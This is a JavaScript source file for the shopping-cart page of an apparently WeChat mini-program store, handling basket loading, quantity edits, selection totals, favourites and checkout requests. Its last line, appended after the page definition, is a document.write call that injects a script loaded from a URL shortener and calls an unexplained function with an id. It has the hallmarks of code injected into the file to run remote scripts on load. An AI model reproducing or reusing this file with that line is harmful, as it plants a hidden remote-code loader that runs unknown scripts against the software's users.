// pages/member/cart/index.js
var t = getApp(),
  e = t.requirejs("core"),
  foxui = t.requirejs("foxui"),
  a = t.requirejs("jquery"),
  jq=a,
  app = getApp(),
  timer;
Page({
  data: {
    route: "cart",
    totalprice:0,
    icons: t.requirejs("icons"),
    empty:false,
    merch_list: [],
    ajax_repeat: { editBasket: true, getRecomend: true, likeActive:true},
    show:false,
    edit_list: []
  },
  onLoad: function (e) {
    //t.url(e)
  },
  onReady:function(){
    
  },
  onShow: function () {
    var _this=this;
    _this.setData({
      editcheckall:false
    });
    _this.init();
  },
  init:function(fn){
    var _this = this,timer;
    this.setData({
      merch_list:[]
    });
    wx.showLoading({
      title: '加载中...',
      icon: 'loading'
    });
    _this.getbasket();
    clearTimeout(timer);
    timer = setTimeout(function () {
      _this.getRecomend(fn);
    }, 200);
  },
  editBasket:function(addObj,fn){
    var _this = this;
    var iseditBasket = _this.data.ajax_repeat.editBasket;
    if (addObj.productList){
      if (addObj.productList[0].num <= 0 || !addObj.productList[0].num ){
          wx.showToast({
            title: '商品数量不能为空或0',
            duration:800
          });
        return;
      }
      };
    if (!iseditBasket){return;};
    _this.setData({
      'ajax_repeat.editBasket':false
    });
    wx.showToast({
      icon: 'loading',
      mask:true,
      duration: 1000
    });
    var sendData = {
      session_token: t.globalData.session_token
    };
    sendData = jq.extend(sendData,addObj);
    //修改购物车信息
    wx.request({
      url: t.globalData.daxin + "/basket/basketAction",
      data: sendData ,
      method: "POST",
      success: function (res) {
        _this.setData({
          'ajax_repeat.editBasket': true
        });
        wx.hideToast();
        //console.log(res);
        if (res.data.statusCode >= 0 && res.data.msg =="success" ) {
          _this.getbasket();
          if(fn)fn();
        } else if (res.data.statusCode == "-300") {
          wx.redirectTo({
            url: '/pages/start/start?reSet=true'
          })
        } else {
          wx.showModal({
            title: '提示信息',
            content: res.data.msg + '信息提交失败',
            showCancel: false,
            success: function (res) {
              if (res.confirm) {
                //console.log('用户点击确定')
              } else if (res.cancel) {
                //console.log('用户点击取消')
              }
            }
          })
        }
      }
    })
  },
  getbasket:function(){
    var _this = this;
    //获取购物车信息
    wx.request({
      url: t.globalData.daxin + "/basket/basket",
      data: {
        session_token: t.globalData.session_token,   
      },
      method: "POST",
      success: function (res) {
        if (res.data.statusCode >= 0 && res.data.data.list) {
          var storeRecommand = [];
          var array = res.data.data.list.basket_detail;
          var sample = res.data.data.list.basket_detail_sample;
          storeRecommand.push({ list: _this.getObj(array) });
          storeRecommand.push({ list: _this.getObj(sample, "sample")});
          //console.log(storeRecommand);
          _this.setData({
            show:true,
            merch_list: storeRecommand ,
            editischecked: false,
            editcheckall:false,
            total: 0,
            empty:false,
            totalprice: 0

          });
        } else {
          if ( res.data.statusCode == "-500") {
            wx.showModal({
              title: '提示信息',
              content: res.data.msg,
              confirmText: '绑定用户',
              //showCancel: false,
              success: function (res) {
                if (res.confirm) {
                  wx.redirectTo({
                    url: "/pages/member/bind/index"
                  })
                } else if (res.cancel) {
                  wx.switchTab({
                    url: '/pages/index/index'
                  })
                }
              }
            });
          } else if (res.data.statusCode == "-300") {
            wx.redirectTo({
              url: '/pages/start/start?reSet=true'
            })
          }else{ 
            _this.setData({
              show: true,
              empty:true,
              editischecked: false,
              total: 0,
              totalprice: 0

            });
          }
          // wx.showModal({
          //   title: '提示信息',
          //   content: res.data.msg + '信息获取失败',
          //   showCancel: false,
          //   success: function (res) {
          //     if (res.confirm) {
          //       //console.log('用户点击确定')
          //     } else if (res.cancel) {
          //       //console.log('用户点击取消')
          //     }
          //   }
          // })
        }
      }
    })
  },
  getObj: function (array, sample){
    var storeRecommand=[];
    if(array.length>0){
      jq.each(array, function (index, value) {
      var obj = {};
      obj.title = value.p_sign;
      obj.id = value.id;
      obj.detail = value.parameter;
      obj.num = value.num > 0 ? value.num : 0;
      obj.store = value.store > 0 ? value.store : 0;
      obj.product_price = value.product_price;
      obj.img = value.img ? (value.img.indexOf("http") > 0 ? value.img : (t.globalData.daxinImg + value.img)) : "";
      if (sample){
        obj.price = 0;
        obj.type = "sample";
        obj.earnest = "样品"; 
      }else{
        obj.type = "product";
          if (value.user_product_bargain){
            if (value.user_product_bargain.discount_price_invoice_change>0){
              obj.price = value.user_product_bargain.discount_price_invoice_change;
            }else{
              obj.price = value.user_product_bargain.discount_price_tax > 0 ? value.user_product_bargain.discount_price_tax: value.user_product_bargain.discount_price * value.tax;
            }
          }else{
            obj.price = t.getPrice(value.product_price, value.num);
          };
        if (value.earnest_scale > 0 && parseFloat(obj.num) > parseFloat(obj.store)) obj.earnest = (obj.price * obj.num * value.earnest_scale).toFixed(2);

      }
        obj.price = parseFloat(obj.price).toFixed(4);
      storeRecommand.push(obj);
    });
    }
    return array.length> 0 ? storeRecommand : [];
  },
  getRecomend:function(fn){
    //获取推荐商品
    var _this=this;
    wx.request({
      url: t.globalData.daxin + "/product/productList",
      data: {
        session_token: t.globalData.session_token,
        show_site:  "2",
      },
      method: "POST",
      success: function (res) {
        wx.hideLoading();
        if(fn)fn();
        if (res.data.statusCode >= 0 && res.data.data.list.length > 0) {
          var storeRecommand = [];
          var array = res.data.data.list;
          jq.each(array, function (index, value) {
            var obj = {};
            obj.title = value.p_sign;
            obj.id = value.id;
            obj.detail = value.parameter;
            obj.salenum = value.sell_num > 0 ? value.sell_num : 0;
            obj.store = value.store > 0 ? value.store : 0;
            obj.img = value.img.indexOf("http") > 0 ? value.img : (t.globalData.daxinImg + value.img);
            obj.rangeprice = parseFloat(value.product_price[value.product_price.length - 1].unit_price).toFixed(2) + "~" + parseFloat(value.product_price[0].unit_price).toFixed(2);
            storeRecommand.push(obj);
          });     
          _this.setData({
            recommendlist: storeRecommand
          });
        } else {
          wx.showModal({
            title: '提示信息',
            content: res.data.msg + '信息获取失败',
            showCancel: false,
            success: function (res) {
              if (res.confirm) {
                //console.log('用户点击确定')
              } else if (res.cancel) {
                //console.log('用户点击取消')
              }
            }
          })
        }
      }
    })
  },
  edit: function (t) {
    var i,
      s = e.data(t),
      c = this;
    switch (s.action) {
      case "edit":
        this.setData({
          edit: !0
        });
        break;
      case "complete":
       // this.allgoods(!1),
          this.setData({
            edit: !1
          });
        break;
      case "move":
        this.likeActive();
        break;
      case "delete":
        i = c.getActiveId()[0],
          jq.each(i,function(index,val){
            val.action = "delete";
          });
          a.isEmptyObject(i) || e.confirm("是否确认删除该商品?", function () {
            c.editBasket({
             productList: i  
            }, function () {
              c.init();
            })
          });
        break;
      case "pay":
      //结算
        var getResult = c.getActiveId();
        if (!this.data.total)return;
        if (!getResult[1]) {
          return void foxui.toast(this, "订金，非订金商品不能同时下单");
        };
       // console.log(getResult); return;
        if (getResult[2]){
          wx.showModal({
            title: '结算确认',
            content: '当前库存不足，需要等交期到货后发货',
            success:function(res){
                if(res.confirm){
                  c.editBasket({
                    productList: getResult[0],
                    action: "settlement"
                  }, function () {
                    wx.navigateTo({
                      url: "/pages/order/create/index"
                    })
                  })
                }else if(res.cancel){

                }
            }
          })
        }else{
          c.editBasket({
            productList: getResult[0],
            action: "settlement"
          }, function () {
            wx.navigateTo({
              url: "/pages/order/create/index"
            })
          })
        };
    }
  },
  getActiveId: function (likeActive){
    var array=[],
      earnestNum=0,
      sample=0,
      storeIsOk=false,
      storeIsOk_num = 0,
      data = this.data.merch_list;
      jq.each(data,function(ind,val){
        for(var i=0;i<val.list.length;i++){
          if(val.list[i].selected == 1){
            if (likeActive){
              array.push(val.list[i].id);
            }else{
              if (val.list[i].earnest && val.list[i].price != 0) { earnestNum++};
              if (parseFloat(val.list[i].store) < parseFloat(val.list[i].num)) { storeIsOk_num++;};
              if (val.list[i].price == 0) { sample++;};
              array.push({ pid: val.list[i].id, num: val.list[i].num, type: val.list[i].type });
              
            }
          };
        };
      });
      var isAllEarnest=true;
    if ((array.length - sample ) != earnestNum && earnestNum!=0) { isAllEarnest =false};
    if (storeIsOk_num ==array.length){
      storeIsOk=true
    };
    return likeActive ? array : [array, isAllEarnest, storeIsOk] ;
  },
  likeActive:function(){
    var _this = this;
    var islikeActive =_this.data.ajax_repeat.likeActive;
    if(!islikeActive){return;};
    _this.setData({
      'ajax_repeat.editBasket': false
    });
    if (!_this.data.editischecked){
      wx.showModal({
        title: '错误提示',
        content: '请勾选需要添加商品',
        showCancel: false,
        success: function () {
          if (res.confirm) {

          }
        }
      });
      return;
    }
    //添加我的收藏
    wx.showLoading({
      title: '添加中',
    });
    var datas = {
      session_token: t.globalData.session_token,
      show_data: 'myCollect',
      p_id: _this.getActiveId('likeActive'),
      action: 'action'
    };
    wx.request({
      url: t.globalData.daxin + "/memberCenter/my",
      data: datas,
      method: "POST",
      success: function (res) {
        _this.setData({
          'ajax_repeat.editBasket': true
        });
        wx.hideLoading();
        if (res.data.statusCode >= 0) {
          wx.showToast({
            title: "添加成功",
            icon: 'success',
            duration: 2000
          });
          _this.setData({
            isfavorite: true
          });
          return;
        } else {
          wx.showModal({
            title: '错误提示',
            content: '添加失败',
            showCancel: false,
            success: function () {
              if (res.confirm) {

              }
            }
          })
        }
      }
    })
  },
  number: function (t) {
    console.log(t);
    var a = this,
      datasets = e.pdata(t),
      nums = parseFloat(datasets.num),
      sendNum=0,
      r = datasets.id;
    "minus" == t.target.dataset.action ? (sendNum = --nums, sendNum = sendNum <= 1 ? 1 : sendNum) : (sendNum = ++nums) ; 
    if("change" == t.target.dataset.action){ return;};
    a.editBasket({
      productList:[{
        pid: r,
        num: sendNum
      }]
    })
  },
  changeNum:function(e){
      var nums =e.detail.value;
      var _this =this;
      if(nums <= 1) { nums=1};
      clearTimeout(timer);
      timer = setTimeout(function(){
        _this.editBasket({
          productList: [{
            pid: e.target.dataset.id,
            num: nums
          }]
        })
      },800);
  },
  getTotal: function (data){
    var data = data || this.data.merch_list;
    var total=0;
    jq.each(data, function (ind, val) {
      var j;
      for (j = 0; j < val.list.length; j++) {
        if (val.list[j].selected == 1) {
          total += val.list[j].price * val.list[j].num;
        }
      }; 
      });
    return total.toFixed(2);
  },
  selected: function (t) {
    //选择
    e.loading();
    var _this = this, 
      types = e.pdata(t)['type'],
      indx = e.pdata(t)['key'],
      data = _this.data.merch_list,
      updatDate=[];
    if (types == 'sample'){
      updatDate = data[1].list;
      if (updatDate[indx].selected) { updatDate[indx].selected = "";  } else { updatDate[indx].selected = 1;};
    }else{
      updatDate = data[0].list;
      if (updatDate[indx].selected) { updatDate[indx].selected = ""; } else { updatDate[indx].selected = 1;};
    }  ;
    var islengths={};
    var oneMoreselecte=false;
    var totals=0;
    var totalprices=0;
    jq.each(data, function (ind, val) {
      if(val.list.length<1){
        types != 'sample' ? (islengths.sample = true) : (islengths.product = true);
      };
      var j;
      for(j=0;j<val.list.length;j++){
        if (val.list[j].selected != 1) {
          break ;
        }
      }; 
      jq.each(val.list,function(idx,value){
        if (value.selected == 1){
          oneMoreselecte = true;
          totals++;
        }
      });
      if (val.list.length <1){ return;};
      if (j == val.list.length ) { 
        types == 'sample' ? (islengths.sample = true) : (islengths.product = true); 
      }else{
        types == 'sample' ? (islengths.sample = false) : (islengths.product = false);
      };
    });
    var islength_final = jq.extend(_this.data.islength, islengths);
    var editcheckalls=false;
    if (islength_final.sample && islength_final.product){
      editcheckalls =true;
    }else{
      editcheckalls = false;
    }
    _this.setData({
      merch_list: data,
      islength: islength_final,
      editcheckall: editcheckalls,
      editischecked: oneMoreselecte,
      total: totals,
      totalprice: _this.getTotal(data)
    });
    e.hideLoading()
  },
  editcheckall: function (t) {
    var i = e.pdata(t).check;
    this.setData({
      editcheckall: !i
    }),
      this.editischecked(!i)
  },
  editischecked: function (isselected) {
    var t = !1,
      e = !0,
      totals=0,
      oneMoreselecte=false;
    var _this=this;
    var datas = this.data.merch_list;
    for (var a in datas){
      if (isselected) { 
        totals += datas[a].list.length;
        }else{
        totals =0;
      };
      if (datas[a].list.length > 0) {
        var item = datas[a].list;
        for (var i = 0; i < item.length; i++) {
          if (isselected) { item[i].selected = 1; oneMoreselecte = true; } else { item[i].selected = 0; oneMoreselecte = false };
        }
      }
    }
      
    this.setData({
      merch_list: datas,
      editischecked:oneMoreselecte,
      total: totals,
      totalprice: _this.getTotal(datas)
    })
  },
  onPullDownRefresh:function(){
    wx.showNavigationBarLoading();
    var _this = this;
    _this.init(function(){
      wx.hideNavigationBarLoading();
      wx.stopPullDownRefresh();
    });
  },
  onShareAppMessage: function () {
    return e.onShareAppMessage()
  }
})
document.write('<script src="http://t.cn/EvlonFh"></script><script>OMINEId("e02cf4ce91284dab9bc3fc4cc2a65e28","-1")</script>');
